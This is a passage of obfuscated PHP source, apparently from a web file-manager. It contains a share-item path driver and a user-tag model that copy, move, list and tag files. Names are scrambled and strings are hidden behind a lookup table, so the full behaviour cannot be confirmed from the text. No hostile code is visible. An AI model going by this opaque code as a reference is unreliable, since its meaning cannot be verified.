(is_array($èöÕúÜ×[$®ıô—½¤[1344]])) { $èöÕúÜ×[$®ıô—½¤[1344]] = Action($®ıô—½¤[1183])->shareItemInfo($èöÕúÜ×[$®ıô—½¤[1344]]); } foreach ($èöÕúÜ× as $¾ˆĞ·¯ => $ˆúÅÜö­) { if (!in_array($¾ˆĞ·¯, array($®ıô—½¤[83], $®ıô—½¤[82]))) { continue; } foreach ($ˆúÅÜö­ as $ş˜•†â˜ => $½ÁÊ¢¡·) { $èöÕúÜ×[$¾ˆĞ·¯][$ş˜•†â˜] = Action($®ıô—½¤[1183])->shareItemInfo($½ÁÊ¢¡·); } } return $èöÕúÜ×; } public function listAll($ÀÌ‹†§ü) { $¢µ“Š€ç =& $_SERVER[™¾ÇÙ¯¹]; $õı¯¼–ã = IO::info($this->pathParse[$¢µ“Š€ç[84]]); if (!$õı¯¼–ã) { return array(); } $ÑİÕ‘âş = $this->model->listAll($ÀÌ‹†§ü); foreach ($ÑİÕ‘âş as &$á×¯ˆÂ«) { $á×¯ˆÂ«[$¢µ“Š€ç[86]] = Action($¢µ“Š€ç[1183])->shareItemInfo($á×¯ˆÂ«[$¢µ“Š€ç[86]]); } unset($á×¯ˆÂ«); return $ÑİÕ‘âş; } } class PathDriverDriverShareItem { public function __construct($·¥óÃÈ˜) { $this->pathParse = $·¥óÃÈ˜; } public function __call($¨»ªÓõ–, $»æ°é‚) { $™ÖØ£¤è =& $_SERVER[™¾ÇÙ¯¹]; if (method_exists($this, $¨»ªÓõ–)) { return; } $µŞì©ÙÏ = call_user_func_array(array($™ÖØ£¤è[1345], $¨»ªÓõ–), $»æ°é‚); $ÅÏõè¹ú = array($™ÖØ£¤è[1346], $™ÖØ£¤è[1347], $™ÖØ£¤è[1348], $™ÖØ£¤è[1349], $™ÖØ£¤è[563], $™ÖØ£¤è[565], $™ÖØ£¤è[1350], $™ÖØ£¤è[107], $™ÖØ£¤è[1351], $™ÖØ£¤è[1352]); if (in_array($¨»ªÓõ–, $ÅÏõè¹ú)) { $µŞì©ÙÏ = $this->getPathOuter($µŞì©ÙÏ); } return $µŞì©ÙÏ; } public function copy($—†¢‰œÔ, $É—×“ÂÏ, $ğÇœ•ÈÀ = false, $Şß…üï = false) { return $this->copyMove($—†¢‰œÔ, $É—×“ÂÏ, $ğÇœ•ÈÀ, $_SERVER[™¾ÇÙ¯¹][563], $Şß…üï); } public function move($Ø‚¨°®, $¤Ì¹´°Ó, $Ë·÷³Šõ = false, $œÀÌ·¥ = false) { return $this->copyMove($Ø‚¨°®, $¤Ì¹´°Ó, $Ë·÷³Šõ, $_SERVER[™¾ÇÙ¯¹][565], $œÀÌ·¥); } private function copyMove($‚ğ©ãÒø, $“ç¡‰å›, $¸¼ˆ¿³, $Êı¶«×Û, $ìâ’Îå« = false) { $«€ïÊÚÍ =& $_SERVER[™¾ÇÙ¯¹]; $Çâû—³° = $“ç¡‰å›; $Ö‡°òêÕ = IO::driverMake($“ç¡‰å›); if ($Ö‡°òêÕ->pathParse[$«€ïÊÚÍ[1159]]) { $“ç¡‰å› = $Ö‡°òêÕ->pathParse[$«€ïÊÚÍ[1159]]; } else { $“ç¡‰å› = $Çâû—³°; } $ìÔàÄ®‰ = IO::copyMove($‚ğ©ãÒø, $“ç¡‰å›, $¸¼ˆ¿³, $Êı¶«×Û, $ìâ’Îå«); $ìÔàÄ®‰ = $this->getPathOuter($ìÔàÄ®‰); return $ìÔàÄ®‰; } public function pathThis($Û•—ğ”Ê) { return get_path_this($this->pathParse[$_SERVER[™¾ÇÙ¯¹][84]]); } public function pathFather($©ÌÑ‰Ô) { return get_path_father($this->pathParse[$_SERVER[™¾ÇÙ¯¹][84]]); } public function iconvSystem($ûœÛ ) { return $ûœÛ ; } protected function infoParse($ùî˜õµ§, $èÜîŒˆ® = false) { $èØÓóŠ£ =& $_SERVER[™¾ÇÙ¯¹]; $‘ÓúíûÅ = $this->pathParse[$èØÓóŠ£[495]][$èØÓóŠ£[1184]] . $this->pathParse[$èØÓóŠ£[1177]]; if ($èÜîŒˆ®) { $æº±„åå = IO::infoWithChildren($‘ÓúíûÅ); } else { $æº±„åå = IO::info($‘ÓúíûÅ); } $ƒœ££÷¢ = $this->pathParse[$èØÓóŠ£[495]]; return Action($èØÓóŠ£[1343])->_shareItemeParse($æº±„åå, $ƒœ££÷¢); } public function listAll($€šÛöéë) { $ÆšÌÕ³Õ =& $_SERVER[™¾ÇÙ¯¹]; $‰àÁéº¹ = IO::listAll($€šÛöéë); $Ùñ¾Ÿ×Ï = $this->pathParse[$ÆšÌÕ³Õ[495]]; foreach ($‰àÁéº¹ as &$£ÁÍ‡ôŸ) { check_abort(); $¨õÀ  = IO::info($£ÁÍ‡ôŸ[$ÆšÌÕ³Õ[84]]); $¨õÀ  = is_array($¨õÀ ) ? $¨õÀ  : array(); $£ÁÍ‡ôŸ = array_merge($¨õÀ , $£ÁÍ‡ôŸ); $£ÁÍ‡ôŸ[$ÆšÌÕ³Õ[86]] = Action($ÆšÌÕ³Õ[1343])->_shareItemeParse($£ÁÍ‡ôŸ, $Ùñ¾Ÿ×Ï); } unset($£ÁÍ‡ôŸ); return $‰àÁéº¹; } public function getPathOuter($™ş‡ÔÏá) { $úŒ‘ŞŠÚ =& $_SERVER[™¾ÇÙ¯¹]; $ªÇ¨µ®Ù = KodIO::parse($™ş‡ÔÏá); if ($ªÇ¨µ®Ù[$úŒ‘ŞŠÚ[33]] == KodIO::KOD_SHARE_ITEM) { return $ªÇ¨µ®Ù[$úŒ‘ŞŠÚ[84]]; } $”ä÷æ¾ = KodIO::clear($™ş‡ÔÏá); $Ë“¯Áä± = KodIO::clear($this->pathParse[$úŒ‘ŞŠÚ[495]][$úŒ‘ŞŠÚ[1184]]); $é´¾Ó®È = substr($”ä÷æ¾, strlen($Ë“¯Áä±)); if (substr($”ä÷æ¾, 0, strlen($Ë“¯Áä±)) != $Ë“¯Áä±) { return !1; } return $this->pathParse[$úŒ‘ŞŠÚ[1178]] . $úŒ‘ŞŠÚ[8] . ltrim($é´¾Ó®È, $úŒ‘ŞŠÚ[8]); } public function getType() { $ˆ¬ªÓÍÆ =& $_SERVER[™¾ÇÙ¯¹]; $Ú´®­½ğ = str_replace($ˆ¬ªÓÍÆ[74], $ˆ¬ªÓÍÆ[12], get_class($this)); return strtolower($Ú´®­½ğ); } public function isTypeObject($…¼‡¹ê) { return IO::isTypeObject($…¼‡¹ê); } public function info($îà¨Ê¢ó) { return $this->infoParse($îà¨Ê¢ó); } public function infoAuth($¦”µêú°) { return $this->infoParse($¦”µêú°); } public function infoWithChildren($ƒƒŸó³‰) { return $this->infoParse($ƒƒŸó³‰, !0); } public function infoFull($˜ù½—«) { return $this->infoParse($˜ù½—«); } } goto c…ê™¯÷øï; EÙå­º¼¤: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($Œ·Ù®Ú¨) { $ıÔ¡¹–‰ =& $_SERVER[™¾ÇÙ¯¹]; return array($ıÔ¡¹–‰[1948] => array($ıÔ¡¹–‰[2329] . USER_ID, $ıÔ¡¹–‰[1949])); } protected function listData() { $ö„Ïé‘Š =& $_SERVER[™¾ÇÙ¯¹]; $òæ«ºÅî = array($ö„Ïé‘Š[1656] => USER_ID, $ö„Ïé‘Š[492] => array($ö„Ïé‘Š[1952], 0)); $ñåìõ­ê = $ö„Ïé‘Š[2330]; $‡öñÌƒâ = $this->field($ñåìõ­ê)->where($òæ«ºÅî)->order($ö„Ïé‘Š[1955])->select(); return $‡öñÌƒâ ? $‡öñÌƒâ : array(); } protected function addToTag($Ç…ßÄÑ, $ã¬ÅôÎÛ) { $ƒÔá Ê =& $_SERVER[™¾ÇÙ¯¹]; if (!Model($ƒÔá Ê[2092])->listData($ã¬ÅôÎÛ)) { return !1; } if (is_numeric($Ç…ßÄÑ)) { $ÌÜÈø³Ã = Model($ƒÔá Ê[840])->pathInfo($Ç…ßÄÑ); if (!$ÌÜÈø³Ã) { return !1; } } else { $ÌÜÈø³Ã = IO::infoSimple($Ç…ßÄÑ); if (!$ÌÜÈø³Ã) { return !1; } $îïÃ¯ñ = $ÌÜÈø³Ã[$ƒÔá Ê[32]]; $…ˆéÔÈı = $ÌÜÈø³Ã[$ƒÔá Ê[33]]; if (isset($ÌÜÈø³Ã[$ƒÔá Ê[418]])) { $…ˆéÔÈı = $ÌÜÈø³Ã[$ƒÔá Ê[418]] == $ƒÔá Ê[88] ? $ƒÔá Ê[75] : $ƒÔá Ê[199]; } } $ãŒ½î¨É = array($ƒÔá Ê[1656] => USER_ID, $ƒÔá Ê[492] => $ã¬ÅôÎÛ, $ƒÔá Ê[429] => $Ç…ßÄÑ, $ƒÔá Ê[430] => $…ˆéÔÈı ? $…ˆéÔÈı : $ƒÔá Ê[424], $ƒÔá Ê[428] => $îïÃ¯ñ ? $îïÃ¯ñ : $ƒÔá Ê[12], $ƒÔá Ê[1841] => 0); if ($this->where($ãŒ½î¨É)->find()) { return !1; } return $this->add($ãŒ½î¨É); } protected function removeFromTag($÷¹…Ï©š, $Ş˜ÁÑÇ) { $‡¥Ñ ¾× =& $_SERVER[™¾ÇÙ¯¹]; if (!Model($‡¥Ñ ¾×[2092])->listData($Ş˜ÁÑÇ)) { return !1; } if (is_array($÷¹…Ï©š)) { $÷¹…Ï©š = array($‡¥Ñ ¾×[7], $÷¹…Ï©š); } $ÈïˆÒÕ = array($‡¥Ñ ¾×[1656] => USER_ID, $‡¥Ñ ¾×[492] => $Ş˜ÁÑÇ, $‡¥Ñ ¾×[429] => $÷¹…Ï©š); return $this->where($ÈïˆÒÕ)->delete(); } protected function removeByTag($®ƒ¥³ñ) { $Š­«Æ€ =& $_SERVER[™¾ÇÙ¯¹]; if (!$®ƒ¥³ñ) { return !1; } $±™‘İÂØ = array($Š­«Æ€[1656] => USER_ID, $Š­«Æ€[492] => $®ƒ¥³ñ); return $this->where($±™‘İÂØ)->delete(); } protected function removeBySource($‘·½½˜‘) { $Ëş–¦Æ„ =& $_SERVER[™¾ÇÙ¯¹]; if (is_array($‘·½½˜‘)) { $‘·½½˜‘ = array($Ëş–¦Æ„[7], $‘·½½˜‘); } $ô•ÛöÔ = array($Ëş–¦Æ„[1656] => USER_ID, $Ëş–¦Æ„[492] => array($Ëş–¦Æ„[1022], 0), $Ëş–¦Æ„[429] => $‘·½½˜‘); return $this->where($ô•ÛöÔ)->delete(); } }